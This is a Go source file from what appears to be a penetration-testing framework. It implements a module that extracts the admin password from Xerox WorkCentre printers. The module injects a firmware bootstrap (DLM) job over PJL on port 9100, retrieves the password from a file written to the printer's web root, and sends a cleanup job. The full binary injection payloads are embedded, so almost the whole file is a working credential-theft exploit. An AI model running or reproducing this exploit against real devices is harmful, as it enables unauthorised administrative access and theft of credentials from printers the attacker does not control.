package unsafe

import (
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"time"

	"papercut/internal/modules"
	"papercut/internal/output"
)

func init() { register(func() modules.ExploitModule { return NewXeroxPJLPwd() }) }

// XeroxPJLPwd extracts the Xerox web management console admin password using
// firmware bootstrap injection (DLM) via PJL on port 9100.
//
// Sends a DLM print job that writes the admin password to /Praeda.txt on the
// printer's web root. After a delay, retrieves the password via HTTP, then
// sends a cleanup DLM job to remove the file.
//
// Based on Metasploit auxiliary/gather/xerox_pwd_extract by Deral Heiland
// and Pete Arzamendi.
//
// Category: UNSAFE — writes to printer filesystem (cleanup job removes artifacts).
type XeroxPJLPwd struct {
	modules.BaseModule
}

// NewXeroxPJLPwd creates a new instance of the Xerox PJL password extractor.
func NewXeroxPJLPwd() *XeroxPJLPwd {
	m := &XeroxPJLPwd{
		BaseModule: modules.BaseModule{
			Mod: modules.Module{
				Name:         "xerox/pjl/pwd_extract",
				Description:  "Xerox Admin Password Extractor — firmware bootstrap injection via PJL (DLM)",
				Manufacturer: "Xerox",
				Category:     "UNSAFE",
				Authors:      []string{"Waffl3ss", "Deral Heiland", "Pete Arzamendi"},
				Tags:         []string{"xerox", "pjl", "dlm", "firmware", "password", "admin", "mfp"},
				Models:       []string{"WorkCentre 5735", "WorkCentre 5745", "WorkCentre 5755", "WorkCentre 5765", "WorkCentre 5775"},
			},
			Opts: []*modules.Option{
				{Name: "RHOST", Default: "", Required: true, Description: "Target IP address"},
				{Name: "RPORT", Default: "80", Required: false, Description: "Target HTTP port (for password retrieval)"},
				{Name: "JPORT", Default: "9100", Required: false, Description: "JetDirect port (for DLM payload delivery)"},
				{Name: "SSL", Default: "false", Required: false, Description: "Use HTTPS for password retrieval"},
				{Name: "VERBOSE", Default: "false", Required: false, Description: "Verbose output"},
				{Name: "TIMEOUT", Default: "45", Required: false, Description: "Seconds to wait for DLM job execution"},
				{Name: "PROXY", Default: "", Required: false, Description: "Proxy (socks5://host:port or http://host:port)"},
			},
		},
	}
	m.InitDefaults()
	return m
}

func (x *XeroxPJLPwd) baseURL() string {
	scheme := "http"
	if x.BoolVal("SSL") {
		scheme = "https"
	}
	return fmt.Sprintf("%s://%s:%s", scheme, x.Val("RHOST"), x.Val("RPORT"))
}

// Check verifies the target has JetDirect port open (basic connectivity test).
func (x *XeroxPJLPwd) Check() (*modules.CheckResult, error) {
	if err := x.Validate(); err != nil {
		return nil, err
	}

	rhost := x.Val("RHOST")
	portInt := x.IntVal("RPORT", 80)
	jport := x.Val("JPORT")
	verbose := x.BoolVal("VERBOSE")

	// Check JetDirect port
	addr := net.JoinHostPort(rhost, jport)
	if verbose {
		output.Info("  Checking JetDirect port %s...", addr)
	}

	conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
	if err != nil {
		return &modules.CheckResult{
			Success: false, Target: rhost, Port: portInt,
			Details: fmt.Sprintf("JetDirect port %s not accessible: %v", jport, err),
		}, nil
	}
	conn.Close()

	// Check HTTP port
	httpURL := x.baseURL() + "/"
	if verbose {
		output.Info("  Checking HTTP port %s...", x.Val("RPORT"))
	}

	httpClient := &http.Client{
		Timeout:   10 * time.Second,
		Transport: modules.NewHTTPTransport(x.Val("PROXY")),
	}
	resp, err := httpClient.Get(httpURL)
	if err != nil {
		return &modules.CheckResult{
			Success: false, Target: rhost, Port: portInt,
			Details: fmt.Sprintf("HTTP port not accessible: %v", err),
		}, nil
	}
	resp.Body.Close()

	return &modules.CheckResult{
		Success: true, Target: rhost, Port: portInt,
		Details: fmt.Sprintf("JetDirect (:%s) and HTTP (:%s) both accessible", jport, x.Val("RPORT")),
	}, nil
}

// Exploit sends the DLM payload, retrieves the password, and cleans up.
func (x *XeroxPJLPwd) Exploit() (*modules.ExploitResult, error) {
	if err := x.Validate(); err != nil {
		return nil, err
	}

	rhost := x.Val("RHOST")
	portInt := x.IntVal("RPORT", 80)
	jport := x.Val("JPORT")
	verbose := x.BoolVal("VERBOSE")
	waitSecs := x.IntVal("TIMEOUT", 45)

	// Step 1: Send extraction DLM payload
	output.Info("Sending DLM extraction payload to %s:%s...", rhost, jport)

	err := x.sendDLM(rhost, jport, dlmExtractPayload, verbose)
	if err != nil {
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: fmt.Sprintf("DLM payload delivery failed: %v", err),
		}, nil
	}

	output.Success("DLM payload delivered")

	// Step 2: Wait for the printer to execute the job
	output.Info("Waiting %d seconds for DLM job execution...", waitSecs)
	time.Sleep(time.Duration(waitSecs) * time.Second)

	// Step 3: Retrieve the password from /Praeda.txt
	output.Info("Retrieving password from %s/Praeda.txt...", x.baseURL())

	password, err := x.retrievePassword(verbose)

	// Step 4: Clean up (always, even on error)
	output.Info("Sending cleanup DLM payload...")
	if cleanErr := x.sendDLM(rhost, jport, dlmCleanupPayload, verbose); cleanErr != nil {
		output.Warn("Cleanup failed: %v", cleanErr)
	} else {
		output.Success("Cleanup payload delivered")
	}

	if err != nil {
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: fmt.Sprintf("Password retrieval failed: %v", err),
		}, nil
	}

	if password == "" {
		return &modules.ExploitResult{
			Success: false, Target: rhost, Port: portInt,
			Details: "No password found in /Praeda.txt — device may not be vulnerable",
		}, nil
	}

	// Display results
	fmt.Println()
	output.Success("--- Xerox Admin Credentials ---")
	output.Success("  Username: Admin")
	output.Success("  Password: %s", password)
	fmt.Println()

	return &modules.ExploitResult{
		Success: true, Target: rhost, Port: portInt,
		Details: "Admin password extracted via DLM firmware injection",
		Data:    fmt.Sprintf("Username: Admin\nPassword: %s", password),
	}, nil
}

// sendDLM connects to the JetDirect port and sends a DLM payload.
func (x *XeroxPJLPwd) sendDLM(host, port string, payload []byte, verbose bool) error {
	addr := net.JoinHostPort(host, port)

	if verbose {
		output.Info("  Connecting to %s...", addr)
	}

	conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
	if err != nil {
		return fmt.Errorf("connect: %w", err)
	}
	defer conn.Close()

	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	_, err = conn.Write(payload)
	if err != nil {
		return fmt.Errorf("write: %w", err)
	}

	if verbose {
		output.Success("  Payload sent (%d bytes)", len(payload))
	}

	return nil
}

// retrievePassword fetches /Praeda.txt from the printer's HTTP interface.
func (x *XeroxPJLPwd) retrievePassword(verbose bool) (string, error) {
	praedaURL := x.baseURL() + "/Praeda.txt"

	if verbose {
		output.Info("  GET %s", praedaURL)
	}

	httpClient := &http.Client{
		Timeout:   10 * time.Second,
		Transport: modules.NewHTTPTransport(x.Val("PROXY")),
	}

	resp, err := httpClient.Get(praedaURL)
	if err != nil {
		return "", fmt.Errorf("HTTP request failed: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("read response: %w", err)
	}

	if resp.StatusCode == 404 {
		return "", fmt.Errorf("/Praeda.txt not found — DLM job may not have executed")
	}

	if resp.StatusCode != 200 {
		return "", fmt.Errorf("HTTP %d", resp.StatusCode)
	}

	// Parse password from response body — it's the content after headers
	password := strings.TrimSpace(string(body))

	if verbose {
		output.Info("  Response: %d bytes", len(body))
	}

	return password, nil
}

// DLM payloads from Metasploit auxiliary/gather/xerox_pwd_extract.
// These are firmware bootstrap injection packets that:
// - dlmExtractPayload: writes the admin password to /Praeda.txt on the web root
// - dlmCleanupPayload: removes /Praeda.txt and cleanup trace files

var dlmExtractPayload = []byte(
	"%%XRXbegin\x0a" +
		"%%OID_ATT_JOB_TYPE OID_VAL_JOB_TYPE_DYNAMIC_LOADABLE_MODULE\x0a" +
		"%%OID_ATT_JOB_SCHEDULING OID_VAL_JOB_SCHEDULING_AFTER_COMPLETE\x0a" +
		"%%OID_ATT_JOB_COMMENT \"\"\x0a" +
		"%%OID_ATT_JOB_COMMENT \"patch\"\x0a" +
		"%%OID_ATT_DLM_NAME \"xerox\"\x0a" +
		"%%OID_ATT_DLM_VERSION \"NO_DLM_VERSION_CHECK\"\x0a" +
		"%%OID_ATT_DLM_SIGNATURE \"8ba01980993f55f5836bcc6775e9da90bc064e608bf878eab4d2f45dc2efca09\"\x0a" +
		"%%OID_ATT_DLM_EXTRACTION_CRITERIA \"extract /tmp/xerox.dnld\"\x0a" +
		"%%XRXend\x0a\x1f\x8b" +
		"\x08\x00\x80\xc3\xf6\x51\x00\x03\xed\xcf\x3b\x6e\xc3\x30\x0c\x06" +
		"\x60\xcf\x39\x05\xe3\xce\x31\x25\xa7\x8e\xa7\x06\xe8\x0d\x72\x05" +
		"\x45\x92\x1f\x43\x2d\x43\x94\x1b\x07\xc8\xe1\xab\x16\x28\xd0\xa9" +
		"\x9d\x82\x22\xc0\xff\x0d\x24\x41\x72\x20\x57\x1f\xc3\x5a\xc9\x50" +
		"\xdc\x91\xca\xda\xb6\xf9\xcc\xba\x6d\xd4\xcf\xfc\xa5\x56\xaa\xd0" +
		"\x75\x6e\x35\xcf\xba\xd9\xe7\xbe\xd6\x07\xb5\x2f\x48\xdd\xf3\xa8" +
		"\x6f\x8b\x24\x13\x89\x8a\xd9\x47\xbb\xfe\xb2\xf7\xd7\xfc\x41\x3d" +
		"\x6d\xf9\x3c\x4e\x7c\x36\x32\x6c\xac\x49\xc4\xef\x26\x72\x98\x13" +
		"\x4f\x96\x6d\x98\xba\xb1\x67\xf1\x76\x89\x63\xba\x56\xb6\xeb\xe9" +
		"\xd6\x47\x3f\x53\x29\x57\x79\x75\x6f\xe3\x74\x32\x22\x97\x10\x1d" +
		"\xbd\x94\x74\xb3\x4b\xa2\x9d\x2b\x73\xb9\xeb\x6a\x3a\x1e\x89\x17" +
		"\x89\x2c\x83\x89\x9e\x87\x94\x66\x97\xa3\x0b\x56\xf8\x14\x8d\x77" +
		"\xa6\x4a\x6b\xda\xfc\xf7\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x8f\xea\x03\x34\x66\x0b\xc1" +
		"\x00\x28\x00\x00")

var dlmCleanupPayload = []byte(
	"%%XRXbegin\x0a" +
		"%%OID_ATT_JOB_TYPE OID_VAL_JOB_TYPE_DYNAMIC_LOADABLE_MODULE\x0a" +
		"%%OID_ATT_JOB_SCHEDULING OID_VAL_JOB_SCHEDULING_AFTER_COMPLETE\x0a" +
		"%%OID_ATT_JOB_COMMENT \"\"\x0a" +
		"%%OID_ATT_JOB_COMMENT \"patch\"\x0a" +
		"%%OID_ATT_DLM_NAME \"xerox\"\x0a" +
		"%%OID_ATT_DLM_VERSION \"NO_DLM_VERSION_CHECK\"\x0a" +
		"%%OID_ATT_DLM_SIGNATURE \"8b5d8c631ec21068211840697e332fbf719e6113bbcd8733c2fe9653b3d15491\"\x0a" +
		"%%OID_ATT_DLM_EXTRACTION_CRITERIA \"extract /tmp/xerox.dnld\"\x0a" +
		"%%XRXend\x0a\x1f\x8b" +
		"\x08\x00\x5d\xc5\xf6\x51\x00\x03\xed\xd2\xcd\x0a\xc2\x30\x0c\xc0" +
		"\xf1\x9e\x7d\x8a\x89\x77\xd3\x6e\xd6\xbd\x86\xaf\x50\xb7\xc1\x04" +
		"\xf7\x41\xdb\x41\x1f\xdf\x6d\x22\x78\xd2\x93\x88\xf8\xff\x41\x92" +
		"\x43\x72\x48\x20\xa9\xf1\x43\xda\x87\x56\x7d\x90\x9e\x95\xa5\x5d" +
		"\xaa\x29\xad\x7e\xae\x2b\x93\x1b\x35\x47\x69\xed\x21\x2f\x0a\xa3" +
		"\xb4\x31\x47\x6d\x55\xa6\x3f\xb9\xd4\xc3\x14\xa2\xf3\x59\xa6\xc6" +
		"\xc6\x57\xe9\xc5\xdc\xbb\xfe\x8f\xda\x6d\xe5\x7c\xe9\xe5\xec\x42" +
		"\xbb\xf1\x5d\x26\x53\xf0\x12\x5a\xe7\x1b\x69\x63\x1c\xeb\x39\xd7" +
		"\x43\x15\xe4\xe4\x5d\x53\xbb\x7d\x4c\x71\x9d\x1a\xc6\x28\x7d\x25" +
		"\xf5\xb5\x0b\x92\x96\x0f\xba\xe7\xf9\x8f\x36\xdf\x3e\x08\x00\x00" +
		"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xfe\xc4\x0d\x40\x0a" +
		"\x75\xe1\x00\x28\x00\x00")
